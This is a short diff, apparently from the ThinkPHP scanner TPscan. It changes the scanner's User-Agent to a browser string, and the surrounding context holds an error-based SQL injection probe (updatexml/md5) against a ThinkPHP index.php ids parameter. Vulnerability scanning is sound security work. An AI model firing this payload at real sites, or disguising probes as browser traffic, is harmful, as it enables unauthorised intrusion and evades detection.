@@ -16,7 +16,7 @@ def thinkphp_debug_index_ids_sqli_verify(url):
         "exception":"",
     }
     headers = {
-        "User-Agent" : "TPscan",
+        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0)",
     }
     payload = 'index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5(2333)),0)]=1'
     try:
